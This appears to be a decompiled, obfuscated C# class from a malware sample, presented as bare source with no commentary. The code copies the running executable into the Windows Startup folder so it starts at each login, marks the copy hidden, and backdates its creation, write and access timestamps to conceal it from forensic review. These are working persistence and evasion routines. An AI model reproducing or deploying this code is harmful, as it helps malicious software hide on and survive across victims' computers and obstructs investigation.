using System;
using System.IO;
using System.Reflection;

namespace ns16;

internal sealed class Class77
{
	private static readonly string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

	public static readonly string string_1 = Assembly.GetEntryAssembly()!.Location;

	private static readonly string string_2 = string_0 + "\\" + Path.GetFileName(string_1);

	public static void smethod_0(string string_3 = null)
	{
		string path = string_3;
		if (string_3 == null)
		{
			path = string_1;
		}
		DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
		File.SetCreationTime(path, dateTime);
		File.SetLastWriteTime(path, dateTime);
		File.SetLastAccessTime(path, dateTime);
	}

	public static void smethod_1(string string_3 = null)
	{
		string fileName = string_3;
		if (string_3 == null)
		{
			fileName = string_1;
		}
		new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
	}

	public static bool smethod_2()
	{
		return File.Exists(string_0 + "\\" + Path.GetFileName(string_1));
	}

	public static void smethod_3()
	{
		File.Copy(string_1, string_2);
		smethod_1(string_2);
		smethod_0(string_2);
	}

	public static bool smethod_4()
	{
		return string_1.StartsWith(string_0);
	}
}
